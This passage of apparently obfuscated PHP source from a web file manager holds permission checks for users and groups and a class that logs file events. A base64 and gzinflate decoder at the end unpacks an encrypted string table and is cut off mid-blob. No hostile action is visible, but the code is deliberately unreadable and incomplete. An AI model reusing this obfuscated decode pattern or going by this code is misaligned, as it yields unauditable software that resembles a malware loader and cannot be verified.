$¡Úø×ˆ = $this->authInfo($øÛ†Æ); if (!$¡Úø×ˆ) { continue; } $âƒ«®ñş = $øÛ†Æ[$š™¡[534]]; $²Çáªı = intval($¡Úø×ˆ[$š™¡[451]]); if ($øÛ†Æ[$š™¡[449]] == SourceModel::TYPE_USER && $âƒ«®ñş == $ºöˆ¤) { $÷¼ˆÕë = !0; $õ¾Ó÷ËŞ = $¡Úø×ˆ; $Ï°˜¿´° = $²Çáªı; } else { if ($øÛ†Æ[$š™¡[449]] == SourceModel::TYPE_GROUP && $this->groupContainUser($âƒ«®ñş, $ºöˆ¤)) { $ĞŞø«©ş = !0; $úµ¼ïí = $this->groupStepToUserGroup($âƒ«®ñş, $ºöˆ¤); if ($úµ¼ïí < $íïçŸÉü) { $íïçŸÉü = $úµ¼ïí; $Ö…Ô›‰• = $²Çáªı; $ÎÔÙ›î = $¡Úø×ˆ; $¯ğÌ¦—¡ = $âƒ«®ñş; } if ($úµ¼ïí == $íïçŸÉü && $²Çáªı >= $Ö…Ô›‰•) { $Ö…Ô›‰• = $²Çáªı; $ÎÔÙ›î = $¡Úø×ˆ; $¯ğÌ¦—¡ = $âƒ«®ñş; } } else { if ($âƒ«®ñş == $š™¡[208]) { $˜Ó—ª¹ã = !0; $©—¡¤ôÜ = $¡Úø×ˆ; $¡’…¡–Ô = $²Çáªı; } } } } if ($÷¼ˆÕë) { $§ÑïªÓÌ = $Ï°˜¿´°; $¡Úø×ˆ = $õ¾Ó÷ËŞ; $©ã±ù¾› = LNG($š™¡[2070]); } else { if ($ĞŞø«©ş) { $§ÑïªÓÌ = $Ö…Ô›‰•; $¡Úø×ˆ = $ÎÔÙ›î; $ØúÒà®ë = Model($š™¡[550])->getInfo($¯ğÌ¦—¡); $©ã±ù¾› = $š™¡[172] . $ØúÒà®ë[$š™¡[554]] . $š™¡[2071] . LNG($š™¡[2072]); } else { if ($˜Ó—ª¹ã) { $§ÑïªÓÌ = $¡’…¡–Ô; $¡Úø×ˆ = $©—¡¤ôÜ; $©ã±ù¾› = LNG($š™¡[2043]); } else { $§ÑïªÓÌ = 0; $¡Úø×ˆ = !1; $©ã±ù¾› = $š™¡[12]; } } } $à¯º¦ˆé = array($š™¡[2062] => intval($§ÑïªÓÌ), $š™¡[2046] => $¡Úø×ˆ, $š™¡[2063] => $©ã±ù¾›, $š™¡[2055] => $øÛ†Æ[$š™¡[440]]); return $à¯º¦ˆé; } private function groupContainUser($Ë—éßæÖ, $¿Ä¶½´û = false) { return in_array($Ë—éßæÖ, $this->userGroupParents($¿Ä¶½´û)); } private function groupStepToUserGroup($æ¥Æò›é, $¿íÄá¤ = false) { $öÊƒ£Œ =& $_SERVER[ªÏ§Ë·]; $Èğ³Í¢ì = $this->userGroupList($¿íÄá¤); $ÓâÎê¸ü = 1000; $ÜÛÜ³—„ = $GLOBALS[$öÊƒ£Œ[6]][$öÊƒ£Œ[99]][$öÊƒ£Œ[1960]] == 1; $×ı¬ıü× = $ÜÛÜ³—„ ? 3 : 2; foreach ($Èğ³Í¢ì as $óÓç§­¹) { if ($óÓç§­¹[$öÊƒ£Œ[1857]] == $æ¥Æò›é) { return 0; } $Ø€ô±›Ş = explode($öÊƒ£Œ[60], trim($óÓç§­¹[$öÊƒ£Œ[549]], $öÊƒ£Œ[60])); if ($Ø€ô±›Ş[0] == $öÊƒ£Œ[208] && count($Ø€ô±›Ş) > $×ı¬ıü×) { $³Ò¼Æî = array_reverse(array_slice($Ø€ô±›Ş, $×ı¬ıü×)); $ĞºêÎ… = array_search($æ¥Æò›é, $³Ò¼Æî); if ($ĞºêÎ… !== !1 && $ĞºêÎ… + 1 <= $ÓâÎê¸ü) { $ÓâÎê¸ü = $ĞºêÎ… + 1; } } } return $ÓâÎê¸ü; } private function userGroupList($è ç—“¨ = false) { $¬Åâ‰©‘ =& $_SERVER[ªÏ§Ë·]; static $£ÒĞ¤Ó = array(); if (isset($£ÒĞ¤Ó[$è ç—“¨])) { return $£ÒĞ¤Ó[$è ç—“¨]; } $ÙŞ×õ¨È = Model($¬Åâ‰©‘[563])->getInfo($è ç—“¨); $£ÒĞ¤Ó[$è ç—“¨] = array_to_keyvalue($ÙŞ×õ¨È[$¬Åâ‰©‘[2044]], $¬Åâ‰©‘[1857]); return $£ÒĞ¤Ó[$è ç—“¨]; } public function userGroupParents($Ş¯êöÏ) { $áô´Ü†ö =& $_SERVER[ªÏ§Ë·]; static $ŠòÚ·ûÚ = array(); $Ş¯êöÏ = $Ş¯êöÏ ? $Ş¯êöÏ : USER_ID; if (isset($ŠòÚ·ûÚ[$Ş¯êöÏ])) { return $ŠòÚ·ûÚ[$Ş¯êöÏ]; } $ˆæ‹¶¼ = $this->userGroupList($Ş¯êöÏ); $²œ¹áö½ = array(); $ÆúøÙîæ = $GLOBALS[$áô´Ü†ö[6]][$áô´Ü†ö[99]][$áô´Ü†ö[1960]] == 1; $àâ³ = $ÆúøÙîæ ? 3 : 2; foreach ($ˆæ‹¶¼ as $ØéØ…¨˜) { $è¥ûµˆ = array($ØéØ…¨˜[$áô´Ü†ö[1857]]); $›ÚŠœ» = explode($áô´Ü†ö[60], trim($ØéØ…¨˜[$áô´Ü†ö[549]], $áô´Ü†ö[60])); if ($›ÚŠœ»[0] == $áô´Ü†ö[208] && count($›ÚŠœ») > $àâ³) { $Ï«ïû°§ = array_slice($›ÚŠœ», $àâ³); $è¥ûµˆ = array_merge($è¥ûµˆ, array_reverse($Ï«ïû°§)); } $²œ¹áö½ = array_merge($²œ¹áö½, $è¥ûµˆ); } $ŠòÚ·ûÚ[$Ş¯êöÏ] = array_unique($²œ¹áö½); return $ŠòÚ·ûÚ[$Ş¯êöÏ]; } public function authTargetInfoMake($Õ¦–Ê¾Œ) { $•ñøòêµ =& $_SERVER[ªÏ§Ë·]; $º¦Ë­ í = array(); $‘Ñ·Ê÷« = array(); foreach ($Õ¦–Ê¾Œ as $÷ôîáäÄ) { if ($÷ôîáäÄ[$•ñøòêµ[449]] == SourceModel::TYPE_USER) { $º¦Ë­ í[] = intval($÷ôîáäÄ[$•ñøòêµ[534]]); } else { if ($÷ôîáäÄ[$•ñøòêµ[449]] == SourceModel::TYPE_GROUP) { $‘Ñ·Ê÷«[] = intval($÷ôîáäÄ[$•ñøòêµ[534]]); } } } if ($º¦Ë­ í) { $º¦Ë­ í = Model($•ñøòêµ[542])->userListInfo($º¦Ë­ í); } if ($‘Ñ·Ê÷«) { $è©ëÉ÷š = array($•ñøòêµ[1945] => array($•ñøòêµ[456], $‘Ñ·Ê÷«)); $‘Ñ·Ê÷« = Model($•ñøòêµ[550])->field($•ñøòêµ[2073])->where($è©ëÉ÷š)->select(); $‘Ñ·Ê÷« = array_to_keyvalue($‘Ñ·Ê÷«, $•ñøòêµ[1857]); } return array($•ñøòêµ[2074] => $º¦Ë­ í, $•ñøòêµ[2075] => $‘Ñ·Ê÷«); } public function authInfo($íâàÒµ) { $¬¨•™ª¼ =& $_SERVER[ªÏ§Ë·]; if ($íâàÒµ[$¬¨•™ª¼[1961]]) { $¿†¡“«Ê = Model($¬¨•™ª¼[536])->listData($íâàÒµ[$¬¨•™ª¼[1961]]); if (!$¿†¡“«Ê) { return !1; $¨ÍÒ®¹œ = Model($¬¨•™ª¼[536])->listData(); $ÖÚßşÈÎ = array_filter_by_field($¨ÍÒ®¹œ, $¬¨•™ª¼[451], $¬¨•™ª¼[208]); return $ÖÚßşÈÎ; } $‘¯õë©ú = array_field_key($¿†¡“«Ê, array($¬¨•™ª¼[437], $¬¨•™ª¼[42], $¬¨•™ª¼[451], $¬¨•™ª¼[1880], $¬¨•™ª¼[1881])); $‘¯õë©ú[$¬¨•™ª¼[2076]] = $íâàÒµ; return $‘¯õë©ú; } else { return array($¬¨•™ª¼[457] => 0, $¬¨•™ª¼[1863] => $íâàÒµ[$¬¨•™ª¼[2021]], $¬¨•™ª¼[458] => $¬¨•™ª¼[12], $¬¨•™ª¼[1880] => $¬¨•™ª¼[2077]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\162\143\145\x5f\x65\x76\x65\x6e\164"; protected $dataAuto = array(array("\143\162\145\141\164\145\x54\x69\155\x65", "\x74\151\x6d\145", "\151\156\163\x65\x72\x74", "\146\165\156\x63\x74\151\157\x6e"), array("\144\x65\163\x63", '', "\151\x6e\163\145\x72\164\x2c\165\160\144\x61\x74\x65\54\163\x65\x6c\x65\143\164", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¤©şëĞ, $ÂÒõ„•³, $ÄŒüêøñ = '') { $¿ş­ã˜ì =& $_SERVER[ªÏ§Ë·]; if (!$this->eventSave) { return; } $£Ø†”™ß = Model($¿ş­ã˜ì[1358])->sourceInfo($¤©şëĞ); if (!$£Ø†”™ß) { return !1; } if ($this->isCacheEvent($£Ø†”™ß, $ÂÒõ„•³)) { return; } if ($ÄŒüêøñ && is_string($ÄŒüêøñ)) { $ÄŒüêøñ = array($¿ş­ã˜ì[1896] => $ÄŒüêøñ); } $›—€ÃÑ² = defined($¿ş­ã˜ì[2078]) ? USER_ID : 0; $İ÷€´Å´ = array($¿ş­ã˜ì[455] => $¤©şëĞ, $¿ş­ã˜ì[2079] => $£Ø†”™ß[$¿ş­ã˜ì[470]], $¿ş­ã˜ì[2080] => $£Ø†”™ß[$¿ş­ã˜ì[42]], $¿ş­ã˜ì[547] => !empty($£Ø†”™ß[$¿ş­ã˜ì[547]]) ? $£Ø†”™ß[$¿ş­ã˜ì[547]] : $¿ş­ã˜ì[12], $¿ş­ã˜ì[1658] => $›—€ÃÑ², $¿ş­ã˜ì[460] => $ÂÒõ„•³, $¿ş­ã˜ì[1660] => $ÄŒüêøñ); $this->addSystemLog($ÂÒõ„•³, $İ÷€´Å´); unset($İ÷€´Å´[$¿ş­ã˜ì[2080]], $İ÷€´Å´[$¿ş­ã˜ì[547]]); return $this->add($İ÷€´Å´); } private function addSystemLog($€†û£ Ò, $ãàÄ¸”ï) { $ÃÉÅƒÇ† =& $_SERVER[ªÏ§Ë·]; if ($€†û£ Ò == $ÃÉÅƒÇ†[2081]) { $€†û£ Ò = $ãàÄ¸”ï[$ÃÉÅƒÇ†[491]][$ÃÉÅƒÇ†[2082]]; } else { if (in_array($€†û£ Ò, array($ÃÉÅƒÇ†[1837], $ÃÉÅƒÇ†[2083]))) { $€†û£ Ò = $ãàÄ¸”ï[$ÃÉÅƒÇ†[491]][$ÃÉÅƒÇ†[782]]; } } $ø¤íá¹ = array_merge($ãàÄ¸”ï, array($ÃÉÅƒÇ†[2084] => $ãàÄ¸”ï[$ÃÉÅƒÇ†[440]], $ÃÉÅƒÇ†[2085] => $ãàÄ¸”ï[$ÃÉÅƒÇ†[2085]])); Hook::trigger($ÃÉÅƒÇ†[2086], $ÃÉÅƒÇ†[2087] . $€†û£ Ò, $ãàÄ¸”ï); Model($ÃÉÅƒÇ†[1801])->addLog($ÃÉÅƒÇ†[2087] . $€†û£ Ò, $ø¤íá¹); } private function isCacheEvent($¥³‚Ñª, $ıŒ÷¤¹ï) { if ($¥³‚Ñª[$_SERVER[ªÏ§Ë·][449]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ñ³ßğ·†, $ÃÚë‹Ü«) { $¬Ÿşô¹ã =& $_SERVER[ªÏ§Ë·]; $İ›Ö•ìÍ = Model($¬Ÿşô¹ã[1358])->sourceInfo($ñ³ßğ·†); $ÔŠ‘‰À§ = array($¬Ÿşô¹ã[2082] => $ÃÚë‹Ü«, $¬Ÿşô¹ã[42] => $İ›Ö•ìÍ[$¬Ÿşô¹ã[42]]); return $this->addEvent($ñ³ßğ·†, $¬Ÿşô¹ã[2081], $ÔŠ‘‰À§); } public function eventFileEdit($»ã¤¢) { $¤‰öâ×£ =& $_SERVER[ªÏ§Ë·]; $¨çøÙ¯¹ = array($¤‰öâ×£[2088] => $_SERVER[$¤‰öâ×£[2089]], $¤‰öâ×£[2090] => strtolower(ACTION)); if (isset($GLOBALS[$¤‰öâ×£[7]][$¤‰öâ×£[2091]])) { $¨çøÙ¯¹[$¤‰öâ×£[2091]] = $¤‰öâ×£[98]; } return $this->addEvent($»ã¤¢, $¤‰öâ×£[1827], $¨çøÙ¯¹); } public function eventRecycle($ÓìÂªÎ©, $ÑÒÔ´—) { return $this->addEvent($ÓìÂªÎ©, $_SERVER[ªÏ§Ë·][2083], $ÑÒÔ´—); } public function eventRemove($À¨øù°¡) { $ùï‰¼ÂÉ =& $_SERVER[ªÏ§Ë·]; $ŒêèËœ— = Model($ùï‰¼ÂÉ[1358])->sourceInfo($À¨øù°¡); $êºÌ·ıÇ = $ŒêèËœ—[$ùï‰¼ÂÉ[42]]; return $this->addEvent($ŒêèËœ—[$ùï‰¼ÂÉ[470]], $ùï‰¼ÂÉ[1826], $êºÌ·ıÇ); } public function eventShare($Óş·—•, $ı¿ËÎ) { return $this->addEvent($Óş·—•, $_SERVER[ªÏ§Ë·][1837], $ı¿ËÎ); } public function eventMove($å¶ÙŸèË, $«÷ƒ Ô£, $¼” şØÁ) { $ ‡‡‘íı =& $_SERVER[ªÏ§Ë·]; $Ô½…Áé = Model($ ‡‡‘íı[1358]); $ïœÒ•Ê÷ = $Ô½…Áé->sourceInfo($å¶ÙŸèË); $¹¦ÖÍ = $Ô½…Áé->sourceInfo($«÷ƒ Ô£); $•Å•‚ï¦ = $Ô½…Áé->sourceInfo($¼” şØÁ); $ä’¦º¢ = array($ ‡‡‘íı[1185] => $«÷ƒ Ô£, $ ‡‡‘íı[2092] => $¹¦ÖÍ[$ ‡‡‘íı[42]], $ ‡‡‘íı[2069] => !empty($¹¦ÖÍ[$ ‡‡‘íı[547]]) ? $¹¦ÖÍ[$ ‡‡‘íı[547]] : $ ‡‡‘íı[12], $ ‡‡‘íı[1186] => $¼” şØÁ, $ ‡‡‘íı[2093] => $•Å•‚ï¦[$ ‡‡‘íı[42]], $ ‡‡‘íı[2094] => !empty($•Å•‚ï¦[$ ‡‡‘íı[547]]) ? $•Å•‚ï¦[$ ‡‡‘íı[547]] : $ ‡‡‘íı[12]); $this->addEvent($å¶ÙŸèË, $ ‡‡‘íı[586], $ä’¦º¢); $ïœÒ•Ê÷ = $Ô½…Áé->sourceInfo($å¶ÙŸèË); $ä’¦º¢ = array($ ‡‡‘íı[440] => $ïœÒ•Ê÷[$ ‡‡‘íı[440]], $ ‡‡‘íı[42] => $ïœÒ•Ê÷[$ ‡‡‘íı[42]]); $this->addEvent($«÷ƒ Ô£, $ ‡‡‘íı[2095], $ä’¦º¢); } public function eventCopy($…«ÛÁ°Š) { $this->eventCreate($…«ÛÁ°Š, $_SERVER[ªÏ§Ë·][584]); } public function eventRename($ùì±ÖõÍ, $ƒ½½Ë¥°, $Ô¹ÅŞÕ„) { $Ì¿û†‰ú =& $_SERVER[ªÏ§Ë·]; $Á©üâĞ¦ = array($Ì¿û†‰ú[1185] => $ƒ½½Ë¥°, $Ì¿û†‰ú[1186] => $Ô¹ÅŞÕ„); return $this->addEvent($ùì±ÖõÍ, $Ì¿û†‰ú[1373], $Á©üâĞ¦); } public function eventAddComment($Ñ¸™ì¤ğ, $ĞÄÈ¥) { return $this->addEvent($Ñ¸™ì¤ğ, $_SERVER[ªÏ§Ë·][2096], $ĞÄÈ¥); } public function eventAddDesc($Ù¤»¼Ø¬, $äí”ÃÊ) { return $this->addEvent($Ù¤»¼Ø¬, $_SERVER[ªÏ§Ë·][2097], $äí”ÃÊ); } public function listBySource($–ı‘Ş³ê) { $†€¶Œ«œ =& $_SERVER[ªÏ§Ë·]; $ï«ŸÏÂ… = Model($†€¶Œ«œ[1358])->sourceInfo($–ı‘Ş³ê); $òŞÑï‡ï = array($†€¶Œ«œ[455] => $–ı‘Ş³ê); if ($ï«ŸÏÂ…[$†€¶Œ«œ[448]] == $†€¶Œ«œ[98]) { $ëÀäè›± = Model($†€¶Œ«œ[1358])->listSearchChildren($–ı‘Ş³ê, 20000); $ëÀäè›±[] = $–ı‘Ş³ê . $†€¶Œ«œ[416]; $òŞÑï‡ï = array($†€¶Œ«œ[440] => array($†€¶Œ«œ[7], $ëÀäè›±)); } $¹ÈŒÍöÃ = $this->where($òŞÑï‡ï)->order($†€¶Œ«œ[2098])->selectPage(); if ($¹ÈŒÍöÃ[$†€¶Œ«œ[404]][$†€¶Œ«œ[405]] == 0) { $¹ÈŒÍöÃ[$†€¶Œ«œ[404]][$†€¶Œ«œ[405]] = 1; $¹ÈŒÍöÃ[$†€¶Œ«œ[407]] = array(array($†€¶Œ«œ[455] => $–ı‘Ş³ê, $†€¶Œ«œ[2079] => $ï«ŸÏÂ…[$†€¶Œ«œ[470]], $†€¶Œ«œ[1658] => $ï«ŸÏÂ…[$†€¶Œ«œ[492]], $†€¶Œ«œ[460] => $†€¶Œ«œ[2099], $†€¶Œ«œ[461] => $ï«ŸÏÂ…[$†€¶Œ«œ[211]], $†€¶Œ«œ[1660] => $†€¶Œ«œ[12])); } return $this->eventListParse($¹ÈŒÍöÃ, $–ı‘Ş³ê); } private function eventListParse($¨Ñ©óÄÏ, $ğŒÌ’ÑÀ) { $å–…ƒ˜ =& $_SERVER[ªÏ§Ë·]; $ÔÑÈõÎ‚ = $¨Ñ©óÄÏ[$å–…ƒ˜[407]]; $­Áù­òî = array_to_keyvalue($ÔÑÈõÎ‚, $å–…ƒ˜[12], $å–…ƒ˜[440]); $ÏîÛ–‚Ù = array_to_keyvalue($ÔÑÈõÎ‚, $å–…ƒ˜[12], $å–…ƒ˜[2085]); foreach ($ÔÑÈõÎ‚ as $ìØ²Áõ) { $ Îï£À = $ìØ²Áõ[$å–…ƒ˜[491]]; if ($ìØ²Áõ[$å–…ƒ˜[43]] == $å–…ƒ˜[586] && isset($ Îï£À[$å–…ƒ˜[1185]])) { $­Áù­òî[] = $ Îï£À[$å–…ƒ˜[1185]] . $å–…ƒ˜[12]; $­Áù­òî[] = $ Îï£À[$å–…ƒ˜[1186]] . $å–…ƒ˜[12]; } if ($ìØ²Áõ[$å–…ƒ˜[43]] == $å–…ƒ˜[2095] && isset($ Îï£À[$å–…ƒ˜[440]])) { $­Áù­òî[] = $ Îï£À[$å–…ƒ˜[440]] . $å–…ƒ˜[12]; } } $­Áù­òî = array_merge($­Áù­òî, $ÏîÛ–‚Ù, array($ğŒÌ’ÑÀ . $å–…ƒ˜[12])); $­Áù­òî = array_unique($­Áù­òî); $ù‡¹±¹ = array_unique(array_to_keyvalue($ÔÑÈõÎ‚, $å–…ƒ˜[12], $å–…ƒ˜[1667])); $Óªã´… = Model($å–…ƒ˜[563])->userListInfo($ù‡¹±¹); $åïçÇĞ‚ = Model($å–…ƒ˜[853])->sourceListInfo($­Áù­òî, !0); foreach ($ÔÑÈõÎ‚ as &$ìØ²Áõ) { if ($ìØ²Áõ[$å–…ƒ˜[43]] == $å–…ƒ˜[586] && isset($ìØ²Áõ[$å–…ƒ˜[491]][$å–…ƒ˜[1185]])) { $ìØ²Áõ[$å–…ƒ˜[491]][$å–…ƒ˜[1185]] = $åïçÇĞ‚[$ìØ²Áõ[$å–…ƒ˜[491]][$å–…ƒ˜[1185]]]; $ìØ²Áõ[$å–…ƒ˜[491]][$å–…ƒ˜[1186]] = $åïçÇĞ‚[$ìØ²Áõ[$å–…ƒ˜[491]][$å–…ƒ˜[1186]]]; } if ($ìØ²Áõ[$å–…ƒ˜[43]] == $å–…ƒ˜[2095] && isset($ìØ²Áõ[$å–…ƒ˜[491]][$å–…ƒ˜[440]])) { $ìØ²Áõ[$å–…ƒ˜[491]][$å–…ƒ˜[440]] = $åïçÇĞ‚[$ìØ²Áõ[$å–…ƒ˜[491]][$å–…ƒ˜[440]]]; } $ìØ²Áõ[$å–…ƒ˜[97]] = $åïçÇĞ‚[$ìØ²Áõ[$å–…ƒ˜[440]]]; $ìØ²Áõ[$å–…ƒ˜[2100]] = $åïçÇĞ‚[$ìØ²Áõ[$å–…ƒ˜[2085]]]; if ($ìØ²Áõ[$å–…ƒ˜[43]] == $å–…ƒ˜[1826]) { $ìØ²Áõ[$å–…ƒ˜[2100]] = $ìØ²Áõ[$å–…ƒ˜[97]]; $ìØ²Áõ[$å–…ƒ˜[2085]] = $ìØ²Áõ[$å–…ƒ˜[2100]][$å–…ƒ˜[440]]; $ìØ²Áõ[$å–…ƒ˜[97]] = !1; $ìØ²Áõ[$å–…ƒ˜[440]] = $å–…ƒ˜[12]; } $ìØ²Áõ[$å–…ƒ˜[2029]] = $Óªã´…[$ìØ²Áõ[$å–…ƒ˜[1667]]]; } unset($ìØ²Áõ); $¨Ñ©óÄÏ[$å–…ƒ˜[407]] = $ÔÑÈõÎ‚; return $¨Ñ©óÄÏ; } public function removeBySource($ÊšŸ‰Ğ¼) { $â€ÇÑ Š = array($_SERVER[ªÏ§Ë·][455] => $ÊšŸ‰Ğ¼); $this->where($â€ÇÑ Š)->remove(); } } goto aÑ‹‚ÊÌ‘‰; D«²ˆÛªÆ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('qs+ny463'), _kodDe('Ln23f5vfow==')); $_SERVER[ªÏ§Ë·] = explode("\174\1\174\4\174\4", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\11\164\133\305\365\60\316\22\326\262\227\355\260\264\57\206\140\73\321\342\354\211\23\307\310\266\34\53\221\55\43\311\131\260\235\227"."\47\351\311\172\266\244\47\353\75\171\313\122\150\331\41\201\2\145\111\200\226\226\255\204\20\50\73\4\50\264\154\145\57\55\5\132\240\54\16\360\53\113\151\200\2\55\360\315"."\162\147\171\117\62\374\376\347\377\235\363\345\44\321\314\235\345\315\334\231\271\163\347\316\275\167\336\177\367\362\117\317\172\153\355\256\153\47\255\235\364\326\57\157\173\371\247\277".base64_decode('oWH0/27oHwn/8Ny9dyF/vn/uOTU1bXP2ndax3/m3b9Vu0m7UzouEn3wqtP8zNy0J')."\xee\xf8\xd5\x93\xa3\x3b\x76\xdd\xe5\xc1\x3d\x47\x57\xd5\xa3\xcc\xb4\x6c\x3d\xfd\x51\xf2\xa6\xad\xe8\x23\x86\x65\x5b\x14\x90\x34\xf3\x69\xa3\x8f\x86\x8d\x3c\xfd\xf5\xd3\x9f\xae\x68\xb8\xa8\xe7"."\114\133\247\121\37\375\121\171\273\160\104\113\33\131\110\307\41\313\30\323\345\224\30\212\207\362\42\135\355\323\155\25\175\322\326\363\254\1\115\201\130\250\131\355\14\304\333\150"."\134\53\24\374\126\152\300\362\153\305\144\306\30\322\303\106\302\237\60\362\376\224\146\153\276\4\153\342\276\364\147\26\164\42\243\47\7\124\55\141\26\155\75\105\101\245\174\326"."\xc8\xf\xd0\xb0\x35\x98\x35\x58\x2f\xd4\x8e\x48\x5c\x8d\x75\x75\x76\x6\xa3\x71\xe8\x4a\xbd\x9c\x9e\x33\x53\x10\x2a\x68\x45\x2d\x7\x8d\x2c\xe8\x45\xb\xe1\x4c\xae\x4e\x2d\x98\x5\x3d\xef\x80"."\10\0\156\154\102\263\240\246\226\46\265\45\330\31\216\254\124\343\53\73\203\220\43\241\16\226\364\342\50\215\221\140\314\326\212\166\334\310\351\74\307\160\221\267\253\51\270\70"."\324\241\304\243\201\216\130\240\71\36\212\164\120\160\163\244\275\75\24\57\207\107\43\341\160\123\240\171\151\171\112\147\64\260\270\75\240\240\366\241\341\60\362\151\263\106\131\115".base64_decode('U1YrtTTQauhZQGNeY82xRwsQivMQmkz5UjZLIx08lNLTWikL2GqRI4WikdNYp5fq')."\243\34\12\143\137\262\115\43\237\244\221\340\210\135\324\4\34\265\65\211\246\43\232\70\24\26\13\206\203\315\161\5\67\120\151\215\106\332\25\30\204\234\146\331\172\121\131\336"."\26\214\6\25\334\350\206\152\322\327\152\5\146\165\7\102\205\22\10\207\225\211\152\260\365\134\201\125\103\313\124\250\54\22\155\11\106\225\246\225\212\300\120\322\314\345\314\274"."\xf\xd5\x82\x46\xd2\x96\x9a\x1a\x8c\x46\x69\xc0\x3\x8b\x30\x1c\xc2\x83\x6\x91\x48\x6b\x6b\x2c\xc8\x63\xd0\xb9\x93\xc2\xa8\x25\x33\x61\x7e\x3a\x62\xa9\x74\xd6\x56\x87\xb4\x6c\x89\x4d\x53\x98"._kodDe('MMPS8d6UrUHzvmUJtoYTPpRXc7Pgb/25ACGbjHYucIP8byWOLCmDcTJ5+93WtvCugg==')."\xab\x7a\x48\x2f\xda\xaa\x9e\x4f\x9a\x29\x23\xf\x24\xa5\x11\x26\x9d\x66\x67\x5a\x8a\x68\x35\x17\x81\x16\x98\xd9\x14\xb\xb\x9a\x81\x29\x44\x47\x29\x27\x67\xe1\x51\x44\xb\xb2\xa9\xa2\x9e\xff"."\356\234\64\32\346\313\25\347\25\261\2\152\11\137\351\106\172\124\254\67\234\257\223\247\132\146\251\230\104\264\53\15\175\237\16\140\335\266\121\347\0\67\206\331\125\310\232\132"."\x2a\xa6\x17\x79\xd7\xc\xb3\x15\x55\x14\x29\xd9\x32\xb0\x44\xb2\xb5\x9a\xc5\x5c\xb\xa2\xc\xf0\x7d\xb4\x2a\x8c\xae\xa\x9\x3\x6c\x5d\xa4\x24\x8c\xf9\x6b\xba\x4f\xf5\x7e\xdd\xdb\x7d\x22\xfa"."\xaf\x16\x8\x74\xf\xb4\x29\xa3\x67\xb3\xaa\x3e\xa2\xc3\xc2\xc9\xa5\x66\x5b\xc\x19\x7e\xb\xd3\x4e\x4\xa1\xd1\x50\x44\xcd\x68\x56\xa6\x3d\x35\x5b\x25\xa5\x18\xdd\x4f\xe9\x23\xbe\x42\xa6\x0".strrev(']¥)(ñn…ĞU0O8s)o•ª|ôÄ.ÛÃH»•–¤Íd{´ í0ë¨ÆÄÇä/š«')."\x59\xa9\xb4\xd5\x1b\xf5\x16\x2b\x98\xcb\xf2\x10\xeb\x1d\x87\x59\x1c\x68\x8f\xb0\xe1\x4c\xa5\x69\x80\xef\xc\x55\xf0\x41\xc3\x22\x14\x4e\x2c\x4f\xb4\xb1\x64\x8d\xa4\x66\x1b\x66\xde\x6f\x26\x6d"."\xdd\xf6\x5a\x76\x51\xd7\xa0\xc6\x40\x32\xa9\x5b\x96\xb7\x19\xed\x4d\x45\x33\xeb\xd\x64\xb3\xe6\xb0\x37\x52\x34\xfa\x8c\x7c\xbd\x32\x15\x88\x2d\xdd\xb8\xbc\x98\x0\xd6\xc3\x4a\xad\x5a\xa0\xe0"."\211\203\77\63\265\241\144\247\275\363\330\12\344\271\213\132\336\112\353\105\157\20\126\106\275\202\32\313\251\40\313\326\142\130\5\323\62\160\363\352\25\315\266\265\144\6\123\20".base64_decode('UX3Dt+Q38G6nl+UNjhSMom6xtiqL2+NQCapd93YWtb6cVq8USgmEGVipFWA0N6Cm')."\136\111\342\250\107\311\225\54\333\133\324\21\51\62\320\166\7\110\16\245\275\355\170\135\31\172\312\33\103\24\33\300\63\353\146\51\150\352\50\54\215\102\333\342\361\116\65\324".base64_decode('irbkjqDaHog3AwsQtLU+1uYwosO8SgZc4UXrC0+uDtRXAew0h/Ui+nDTaL0yYKYS')."\346\210\217\45\265\2\63\302\62\343\341\56\330\336\250\226\357\303\370\111\214\332\72\114\101\153\250\317\211\350\260\236\357\263\63\254\140\54\30\135\26\214\252\261\110\153\174\171"."\40\12\233\171\36\315\222\21\366\51\134\165\326\33\325\123\10\365\111\233\225\323\12\30\153\54\17\136\34\170\254\130\52\136\60\54\55\34\132\214\21\323\342\265\120\46\257\234"."\213\325\35\66\162\6\156\273\315\123\10\46\321\116\277\30\32\344\47\35\152\350\261\246\326\364\244\246\325\172\321\377\123\153\273\173\132\174\123\173\33\375\206\50\343\237\356\233"."\256\314\250\233\243\164\42\326\303\320\262\12\164\272\54\107\235\22\131\352\104\213\230\315\171\63\257\177\13\162\360\336\45\55\173\27\132\51\60\32\74\251\53\30\213\253\355\301"."\x78\x5b\xa4\x5\xbe\x1e\xc\x40\x28\x6c\xd2\x65\xcb\x7a\xdb\x4d\x7f\x7a\x61\x74\x7b\xe9\x8f\x6a\x58\xad\xd2\xb6\x82\xa3\x9c\xfc\xa8\x66\xa2\x1f\xd\x46\xbb\xce\x68\x6c\x9a\xd2\xe8\x50\x4e\xeb".strrev('Â +P}V£:[#)‹-EšÌÒ[\\¾'."\0".'Ëèİ6Ñ@|R7-U±ÔY»Xâ†<ˆ“')."\42\22\63\162\5\326\130\73\123\312\45\244\40\120\173\233\357\124\26\232\111\54\234\61\371\316\206\270\137\32\252\367\103\221\51\63\132\31\335\367\307\146\242\277\202\310\247\314".strrev('FKÃ:³Ò™ZÆÛÄ©4>LF!„ÆmB